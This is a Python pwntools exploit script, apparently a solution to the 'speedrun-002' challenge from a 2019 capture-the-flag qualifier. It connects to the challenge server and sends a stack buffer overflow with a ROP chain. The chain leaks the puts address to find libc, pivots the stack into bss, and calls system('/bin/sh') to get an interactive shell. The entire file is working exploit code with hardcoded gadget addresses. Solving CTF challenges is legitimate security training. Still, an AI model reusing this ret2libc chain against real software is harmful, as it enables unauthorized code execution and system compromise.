#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./speedrun-002')
else:
    s = remote('speedrun-002.quals2019.oooverflow.io', 31337)

elf = ELF('./speedrun-002')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = 0x4008a3
pop_rsi_r15 = 0x4008a1
pop_rdx = 0x4006ec
leave = 0x40074a

s.sendafter('now?\n', 'Everything intelligent is so boring.')

bss_addr = elf.bss(0x500)

payload = ''
payload += 'A' * 0x400
payload += p64(bss_addr - 8)
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.symbols['puts'])
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss_addr) + p64(0)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(elf.symbols['read'])
payload += p64(leave)
s.sendafter('more.\n', payload)

s.recvline()
libc_base = u64(s.recvline(False).ljust(8, '\0')) - libc.symbols['puts']
log.info('libc base: %#x' % libc_base)

payload = ''
payload += p64(pop_rdi) + p64(libc_base + libc.search('/bin/sh').next())
payload += p64(libc_base + libc.symbols['system'])
s.send(payload)
s.interactive()
